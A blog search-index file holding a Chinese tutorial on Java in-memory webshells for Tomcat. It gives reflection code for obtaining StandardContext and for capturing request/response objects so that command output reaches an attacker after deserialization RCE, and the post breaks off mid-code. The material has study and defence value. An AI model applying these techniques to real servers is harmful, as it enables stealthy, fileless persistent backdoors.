<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Java内存马总结</title>
      <link href="/2023/09/18/java%E5%86%85%E5%AD%98%E9%A9%AC%E6%80%BB%E7%BB%93/"/>
      <url>/2023/09/18/java%E5%86%85%E5%AD%98%E9%A9%AC%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="技术铺垫"><a href="#技术铺垫" class="headerlink" title="技术铺垫"></a>技术铺垫</h1><h2 id="Tomcat容器组件"><a href="#Tomcat容器组件" class="headerlink" title="Tomcat容器组件"></a>Tomcat容器组件</h2><p><code>Tomcat</code> 中有四类容器组件：<code>Engine</code> 、<code>Host</code>  、<code>Context</code> 、 <code>Wrapper</code> ；关系如下</p><ul><li><code>Engine</code>（ <code>org.apache.catalina.core.StandardEngine</code> ）：最大的容器组件，可以容纳多个 <code>Host</code> 。</li><li><code>Host</code>（ <code>org.apache.catalina.core.StandardHost</code> ）：一个 <code>Host</code> 代表一个虚拟主机，一个 <code>Host</code> 可以包含多个 <code>Context</code> 。</li><li><code>Context</code>（ <code>org.apache.catalina.core.StandardContext</code> ）：一个 <code>Context</code> 代表一个 <code>Web</code> 应用，其下可以包含多个 <code>Wrapper</code> 。</li><li><code>Wrapper</code>（ <code>org.apache.catalina.core.StandardWrapper</code> ）：一个 <code>Wrapper</code> 代表一个 <code>Servlet</code>（<strong>重点</strong> ：想要动态的去注册 <code>Servlet</code> 组件实现过程中的关键之一就是如何获取 <code>Wrapper</code> 对象，再往上也就是如何获取到 <code>Context</code> 对象，从而掌握整个 <code>Web</code> 应用）。</li></ul><h2 id="Servlet基础组件"><a href="#Servlet基础组件" class="headerlink" title="Servlet基础组件"></a>Servlet基础组件</h2><p><code>Servlet</code> 的三大基础组件为：<code>Servlet</code> ，<code>Filter</code> ，<code>Listener</code> 。<br>在服务端处理一个请求时，上面三个组件的处理顺序如下：</p><p><code>Listener</code> -&gt; <code>Filter</code> -&gt; <code>Servlet</code> </p><ul><li><p><code>Servlet</code> : </p><blockquote><p>最基础的控制层组件，用于动态处理前端传递过来的请求，每一个 <code>Servlet</code> 都可以理解成运行在服务器上的一个 <code>java</code> 程序。生命周期：从 <code>Tomcat</code> 的 <code>Web</code> 容器启动开始，到服务器停止调用其 <code>destroy()</code> 结束，驻留在内存里面。</p></blockquote></li><li><p><code>Filter</code> ：</p><blockquote><p>过滤器，过滤一些非法请求或不当请求，一个 <code>Web</code> 应用中一般是一个 <code>filterChain</code> 链式调用其 <code>doFilter()</code> 方法，存在一个顺序问题。</p></blockquote></li><li><p><code>Listener</code> ：</p><blockquote><p>监听器，以 <code>ServletRequestListener</code> 为例，<code>ServletRequestListener</code> 主要用于监听 <code>ServletRequest</code> 对象的创建和销毁，一个 <code>ServletRequest</code> 可以注册多个 <code>ServletRequestListener</code> 接口（都有 <code>request</code> 来都会触发这个）。</p></blockquote></li></ul><h1 id="内存马的思路分析"><a href="#内存马的思路分析" class="headerlink" title="内存马的思路分析"></a>内存马的思路分析</h1><h2 id="补充说明"><a href="#补充说明" class="headerlink" title="补充说明"></a>补充说明</h2><p>在 <code>IDEA</code> 的 <code>jsp</code> 中，由于 <code>tomcat</code> 是通过 <code>add configuration</code> 集成的，因此我们无法直接看到 <code>tomcat</code> 的源码。 </p><p><img src="/imgs/20220720153128.png"></p><p>我们需要通过下面的方式进行导入。</p><p>在 <code>project structure</code> 里面找到 <code>libraries</code>，点加号，<code>Java</code>：</p><p><img src="/imgs/20230214005423.png"></p><p>然后把 <code>tomcat</code> 的 <code>lib</code> 下面的所有 <code>jar</code> 包都给导进来就行了：</p><p><img src="/imgs/1676307141490.png"></p><h2 id="Tomcat的Context分析"><a href="#Tomcat的Context分析" class="headerlink" title="Tomcat的Context分析"></a>Tomcat的Context分析</h2><p>在前面提到了，在 <code>Tomcat</code> 中，一个 <code>Context</code> 代表一个 <code>Web</code> 应用。因此我们想要操控整个 <code>web</code> 应用，自然而然会想到先到得到 <code>Tomcat</code> 的 <code>Context</code> 。</p><p><img src="/imgs/1694353848939.png"></p><p><code>Context</code> 是一个接口，在 <code>Tomcat</code> 中 <code>Context</code> 的是实现类是 <code>StandardContext</code> 类。</p><blockquote><p>需要注意的是，我们知道 <code>SpringBoot</code> 中内置了 <code>Tomcat</code> ，在 <code>SpringBoot</code> 中， <code>Tomcat</code> 的 <code>Context</code> 的实现类是 <code>TomcatEmbeddedContext</code> ，但是也不影响后面的分析，因为 <code>TomcatEmbeddedContext</code> 是 <code>StandardContext</code> 的子类。</p></blockquote><p><code>Context</code> 的实现类就下面三个（在 <code>idea</code> 中通过  <code>Ctrl+alt+b</code> 来查看）（原生的 <code>Tomcat</code> 没有 <code>TomcatEmbeddedContext</code> 类，这是 <code>SpringBoot</code> 中 <code>Tomcat</code> 带的）。其 <code>UML</code> 类图如下：</p><p><img src="/imgs/1694357723860.png"></p><ul><li><code>jsp</code> 中的 <code>context</code></li></ul><p><img src="/imgs/1694357246799.png"></p><ul><li><code>SpringBoot</code> 中的 <code>context</code></li></ul><p><img src="/imgs/1694357639653.png"></p><h2 id="获取StandardContext的几种方式"><a href="#获取StandardContext的几种方式" class="headerlink" title="获取StandardContext的几种方式"></a>获取StandardContext的几种方式</h2><p>下面重点介绍在 <code>jsp</code> 的一次请求中，获取 <code>Tomcat</code> 的 <code>Conetxt</code> （ <code>StandardContext</code> ）的几种方法。（下面的方法都可以带入到 <code>SpringBoot</code> 中，就是有些细节需要修改。）</p><h3 id="方式一：通过request获取"><a href="#方式一：通过request获取" class="headerlink" title="方式一：通过request获取"></a>方式一：通过request获取</h3><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><blockquote><p><code>Tomcat</code> 中 <code>Web</code> 应用中获取的 <code>request.getServletContext()</code> 是 <code>ApplicationContextFacade</code> 对象。该对象对 <code>ApplicationContext</code> 进行了封装，而 <code>ApplicationContext</code> 实例中又包含了 <code>StandardContext</code> 实例，所以当<code>request</code> 存在的时候我们可以通过反射来获取 <code>StandardContext</code> 对象。</p></blockquote><p><img src="/imgs/1694359297148.png"></p><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><p>第一个方式不难，下面直接给出代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">// request是RequestFacade的类对象，servletContext是ApplicationContextFacade的类对象</span></span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ApplicationContextFacade类有一个context的私有属性，其类型为ApplicationContext</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">servletContextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    servletContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) servletContextField.get(servletContext);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ApplicationContext类也有一个context的私有属性，其类型为StandardContext类(在SpringBoot中则为TomcatEmbeddedContext类)</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">applicationContextField</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    applicationContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) applicationContextField.get(applicationContext);</span><br><span class="line"></span><br><span class="line">    System.out.println(<span class="string">&quot;standardContext = &quot;</span> + standardContext);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h3 id="方式二：从currentThread中的ContextClassLoader中获取"><a href="#方式二：从currentThread中的ContextClassLoader中获取" class="headerlink" title="方式二：从currentThread中的ContextClassLoader中获取"></a>方式二：从currentThread中的ContextClassLoader中获取</h3><h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><p>在 <code>Tomcat</code> 处理请求的线程中，存在 <code>ContextClassLoader</code> 对象，而这个对象（ <code>WebappClassLoaderBase</code> ）的 <code>resources</code> 属性中又保存了<code>StandardContext</code> 对象。（使用于 <code>Tomcat 8~9</code> ）</p><blockquote><p>但是需要注意的是，由于这个方法在 <code>Tomcat</code> 中没有被使用，而且存在危险性（在暴露了 <code>classLoader</code> 的情况下，会导致黑客接触到 <code>Tomcat</code> 的内部），因此在 <code>Tomcat</code> 的高版本（在 <code>9点几</code> 以上）废弃了 <code>getResources()</code> 这个方法，导致其一直返回 <code>NULL</code> ，因此需要通过反射才能拿到 <code>ContextClassLoader</code> 的 <code>resources</code> 属性。</p></blockquote><p><img src="/imgs/1694364646768.png"></p><ul><li>低版本 <code>tomcat</code></li></ul><p><img src="/imgs/1694364732351.png"></p><ul><li>高版本 <code>tomcat</code></li></ul><p><img src="/imgs/1694364714812.png"></p><h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><p>下面给出用 <code>getResources()</code> 获取 <code>resources</code> 的代码和用反射获取 <code>resources</code> 的代码。</p><ul><li>使用 <code>getResources()</code> （适用于低版本 <code>Tomcat</code> ， <code>9</code> 以下）</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">WebappClassLoaderBase</span> <span class="variable">contextClassLoader</span> <span class="operator">=</span> (WebappClassLoaderBase)Thread.currentThread().getContextClassLoader();</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) contextClassLoader.getResources().getContext();</span><br></pre></td></tr></table></figure><ul><li>使用反射（适用于高版本 <code>Tomcat</code> ，<code>9</code> 及以上）</li></ul><p>注意这里的 <code>contextClassLoader</code> 实际是 <code>ParallelWebappClassLoader</code> 类型的（ <code>WebappClassLoaderBase</code> 抽象类的子类），<code>resources</code> 属性在 <code>WebappClassLoaderBase</code> 类中。因此这里获取 <code>resources</code> 属性需要在其父类去找，<code>getDeclaredField()</code> 无法获取父类的属性。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.loader.WebappClassLoaderBase&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.webresources.StandardRoot&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">WebappClassLoaderBase</span> <span class="variable">contextClassLoader</span> <span class="operator">=</span> (WebappClassLoaderBase)Thread.currentThread().getContextClassLoader();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 注意这里的contextClassLoader实际是ParallelWebappClassLoader类型的（WebappClassLoaderBase抽象类的子类），resources属性在WebappClassLoaderBase类中</span></span><br><span class="line">    <span class="comment">// 因此这里获取resources属性需要在其父类去找，getDeclaredField()无法获取父类的属性</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">resources</span> <span class="operator">=</span> contextClassLoader.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;resources&quot;</span>);</span><br><span class="line">    resources.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardRoot</span> <span class="variable">standardRoot</span> <span class="operator">=</span> (StandardRoot) resources.get(contextClassLoader);</span><br><span class="line"></span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardRoot.getContext();</span><br><span class="line"></span><br><span class="line">    System.out.println(<span class="string">&quot;standardContext = &quot;</span> + standardContext);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h3 id="方式三：从ThreadLocal中获取"><a href="#方式三：从ThreadLocal中获取" class="headerlink" title="方式三：从ThreadLocal中获取"></a>方式三：从ThreadLocal中获取</h3><h4 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h4><blockquote><p>由于在 <code>jsp</code> 中内置了 <code>request</code> 和 <code>response</code> 所以我们能直接获取到 ，于是我们可以直接在 <code>response</code> 写我们的回显内容， 但是当我们结合反序列化打的时候，由于注入的是字节码所以我们需要通过一些手段获取到 <code>request</code> 和 <code>response</code> 这样我们才能进行回显。（除非我们能通过反序列化 <code>RCE</code> 直接上传 <code>jsp</code> 的 <code>shell</code> 页面到服务器的网页目录，但是这就不叫内存马了，我们不能落地文件。）</p></blockquote><p><code>kingkk</code> 师傅的思路是寻找一个静态的可以存储 <code>request</code> 和 <code>response</code> 的变量，因为如果不是静态的话，那么我们还需要获取到对应的实例，最终 <code>kingkk</code> 师傅找到了如下位置：</p><p>这里  <code>lastServicedRequest</code> 和 <code>lastServicedResponse</code> 都是静态变量。</p><p><img src="/imgs/1676393214391.png"></p><p>在 <code>ApplicationFilterChain#internalDoFilter</code>中，发现在 <code>WRAP_SAME_OBJECT</code> 为 <code>true</code> ，就会调用 <code>set</code> 函数将我们的 <code>request</code> 和 <code>response</code> 存放进去，那么 <code>lastServicedRequest</code> 和 <code>lastServicedResponse</code> 是在哪里初始化的呢？</p><p><img src="/imgs/1676393383283.png"></p><p>我们看到该文件的最后，发现在静态代码块处会进行一次设置，由于静态代码片段是优先执行的，而且最开始 <code>ApplicationDispatcher.WRAP_SAME_OBJECT</code> 默认为 <code>False</code> ，所以 <code>lastServicedRequest</code> 和 <code>lastServicedResponse</code> 一开始默认为 <code>null</code> 。</p><p><img src="/imgs/1676393292111.png"></p><p>所以我们需要利用反射来修改 <code>WRAP_SAME_OBJECT</code> 为 <code>true</code> ，同时初始化 <code>lastServicedRequest</code> 和 <code>lastServicedResponse</code> ，大致代码如下：</p><p><img src="/imgs/Pasted%20image%2020230215005058.png"></p><p>那么这样我们的 <code>request</code> 和 <code>response</code> 就被存放在其中了。</p><p>这样当我们第二次访问的时候将 <code>response</code> 从 <code>lastServicedResponse</code> 中取出来，然后将我们命令执行的结果直接写在 <code>response</code> 里面就可以了。</p><p>所以这里的大致思路如下：</p><ol><li>第一次访问利用反射修改特定参数，从而将 <code>request</code> 和 <code>response</code> 存储到 <code>lastServicedRequest</code> 和 <code>lastServicedResponse</code> 中。</li><li>第二次访问将我们需要的 <code>request</code> 和 <code>response</code> 取出，从而将结果写入 <code>response</code> 中从而达到回显目的。</li></ol><p><img src="/imgs/1676394901744.png"></p><h4 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h4><p>再正向分析一遍流程就会更加清晰了。</p><p>由于 <code>WRAP_SAME_OBJECT</code> 默认为 <code>False</code> ，所以在启动阶段 <code>lastServicedRequest</code> 和 <code>lastServicedResponse</code> 为 <code>null</code> 。</p><p><img src="/imgs/Pasted%20image%2020230215012648.png"></p><p>第一次访问 <code>/echo</code> 后 ，此时还没有解析我们的java代码所以 <code>WRAP_SAME_OBJECT</code>为 <code>False</code> 。</p><p><img src="/imgs/Pasted%20image%2020230215012721.png"></p><p>由于 <code>Globals.IS_SECURITY_ENABLED</code> 默认为 <code>False</code> 所以就会进入 <code>else</code>，在 <code>else</code> 中 <code>this.servlet.service</code> 会来到我们自己的代码处理。</p><p><img src="/imgs/Pasted%20image%2020230215012753.png"></p><p>来到我们自己的代码处</p><p><img src="/imgs/Pasted%20image%2020230215012810.png"></p><p>由于默认为 <code>false</code> 且 <code>lastServicedRequest</code> 和 <code>lastServicedResponse</code> 都为 <code>null</code>，所以会进入我们的 <code>if</code> 判断，在判断中会调用反射来对值进行修改。<br><img src="/imgs/Pasted%20image%2020230215012843.png"></p><p>设置完之后进到 <code>finally</code>，在 <code>finally</code> 中又将 <code>lastServicedRequest</code> 和 <code>lastServicedResponse</code> 设为了 <code>null</code> 。</p><p>ps：这里的 <code>null</code> 和 静态代码片段中的 <code>null</code> 不同，这里是对象。</p><p>![<a href="imgs/Pasted%20image%2020230215012920.png"></a></p><p>至此第一次访问就结束了，接下来进行第二次也就是我们的命令执行环境</p><p>由于第一次中我们利用反射修改了 <code>WRAP_SAME_OBJECT</code> 为 <code>true</code>，所以这里会调用 <code>set</code> 将 <code>request</code> 和 <code>response</code> 进行存入。</p><p><img src="/imgs/Pasted%20image%2020230215012956.png"></p><p>然后进入下方 <code>else</code> 触发我们自己的代码<br><img src="/imgs/Pasted%20image%2020230215013007.png"></p><p>在我们的代码中，已正常获取到了我们的 <code>request</code> 和 <code>response</code> ，同时我们的 <code>cmd</code> 也不为 <code>null</code>，所以就来到了执行命令处进行了命令执行，并且将结果直接在 <code>response</code> 中写入。</p><p><img src="/imgs/Pasted%20image%2020230215013049.png"></p><p>最终在前端页面获得命令输出结果。</p><h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Modifier&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">  <span class="comment">// 1.让需要的变量先可修改</span></span><br><span class="line">  <span class="type">Class</span> <span class="variable">applicationDispatcher</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>);</span><br><span class="line">  <span class="type">Field</span> <span class="variable">WRAP_SAME_OBJECT_FIELD</span> <span class="operator">=</span> applicationDispatcher.getDeclaredField(<span class="string">&quot;WRAP_SAME_OBJECT&quot;</span>);</span><br><span class="line">  WRAP_SAME_OBJECT_FIELD.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  <span class="comment">// 利用反射修改 final 变量 ，不这么设置无法修改 final 的属性</span></span><br><span class="line">  <span class="type">Field</span> <span class="variable">f0</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.reflect.Field&quot;</span>).getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">  f0.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  f0.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line"></span><br><span class="line">  <span class="type">Class</span> <span class="variable">applicationFilterChain</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);</span><br><span class="line">  <span class="type">Field</span> <span class="variable">lastServicedRequestField</span> <span class="operator">=</span> applicationFilterChain.getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);</span><br><span class="line">  <span class="type">Field</span> <span class="variable">lastServicedResponseField</span> <span class="operator">=</span> applicationFilterChain.getDeclaredField(<span class="string">&quot;lastServicedResponse&quot;</span>);</span><br><span class="line">  lastServicedRequestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  lastServicedResponseField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  f0.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">  f0.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 获取lastServicedRequest,lastServicedResponse,刚开始这里由于WRAP_SAME_OBJECT_FIELD为false，因此下面两个变量都是null</span></span><br><span class="line">  ThreadLocal&lt;ServletRequest&gt; lastServicedRequest = (ThreadLocal&lt;ServletRequest&gt;) lastServicedRequestField.get(applicationFilterChain);</span><br><span class="line">  ThreadLocal&lt;ServletResponse&gt; lastServicedResponse = (ThreadLocal&lt;ServletResponse&gt;) lastServicedResponseField.get(applicationFilterChain);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (lastServicedRequest == <span class="literal">null</span>)&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;没有获取到request&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    System.out.println(lastServicedRequest.get());</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (lastServicedResponse == <span class="literal">null</span>)&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;没有获取到response&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    System.out.println(lastServicedResponse.get());</span><br><span class="line">    <span class="comment">// 在这里可以执行命令，并回显命令结果</span></span><br><span class="line">    lastServicedResponse.get().getWriter().write(<span class="string">&quot;inject success&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  WRAP_SAME_OBJECT_FIELD.setBoolean(applicationDispatcher, <span class="literal">true</span>);</span><br><span class="line">  lastServicedRequestField.set(applicationFilterChain, <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>());</span><br><span class="line">  lastServicedResponseField.set(applicationFilterChain, <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>());</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><img src="/imgs/1694367069990.png"></p><h3 id="方式四：通过MBean获取"><a href="#方式四：通过MBean获取" class="headerlink" title="方式四：通过MBean获取"></a>方式四：通过MBean获取</h3><h4 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h4><p>通过 <code>MBean</code> 获取。（如果是 <code>jsp</code> 那就可以直接用。如果在 <code>SpringBoot</code> 中用，那前提是在 <code>SpringBoot</code> 中开启 <code>Tomcat</code> 的 <code>mbeanregistry</code> 功能，默认是关闭的）</p><ul><li><code>application.yml</code></li></ul><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">tomcat:</span></span><br><span class="line">    <span class="attr">mbeanregistry:</span></span><br><span class="line">      <span class="attr">enabled:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>在 <code>SpringBoot</code> 中，如果不开启 <code>mbeanregistry</code> ，就会像下面获取不到 <code>mbeanServer</code> 。</p><p><img src="/imgs/1694370246853.png"></p><p>参考 <code>https://mp.weixin.qq.com/s/eI-50-_W89eN8tsKi-5j4g</code></p><ul><li><code>jsp</code> 的获取方式流程</li></ul><p><img src="/imgs/1694370100935.png"></p><ul><li><code>SpringBoot</code> 的获取方式流程</li></ul><p><img src="/imgs/1694284472023.png"></p><h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><p>注意下面代码中，要根据环境来选择 <code>domainTb.get(&quot;xxx&quot;)</code> 中的 <code>xxx</code> 填什么。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.authenticator.NonLoginAuthenticator&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.modeler.BaseModelMBean&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;com.sun.jmx.mbeanserver.NamedObject&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.HashMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.management.MBeanServer&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.modeler.Registry&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">  <span class="type">MBeanServer</span> <span class="variable">mBeanServer</span> <span class="operator">=</span> Registry.getRegistry(<span class="literal">null</span>, <span class="literal">null</span>).getMBeanServer();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 获取mbsInterceptor</span></span><br><span class="line">  <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.sun.jmx.mbeanserver.JmxMBeanServer&quot;</span>).getDeclaredField(<span class="string">&quot;mbsInterceptor&quot;</span>);</span><br><span class="line">  field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  <span class="type">Object</span> <span class="variable">mbsInterceptor</span> <span class="operator">=</span> field.get(mBeanServer);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 获取repository</span></span><br><span class="line">  field = Class.forName(<span class="string">&quot;com.sun.jmx.interceptor.DefaultMBeanServerInterceptor&quot;</span>).getDeclaredField(<span class="string">&quot;repository&quot;</span>);</span><br><span class="line">  field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  <span class="type">Object</span> <span class="variable">repository</span> <span class="operator">=</span> field.get(mbsInterceptor);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 获取domainTb</span></span><br><span class="line">  field = Class.forName(<span class="string">&quot;com.sun.jmx.mbeanserver.Repository&quot;</span>).getDeclaredField(<span class="string">&quot;domainTb&quot;</span>);</span><br><span class="line">  field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  HashMap&lt;String, Map&gt; domainTb = 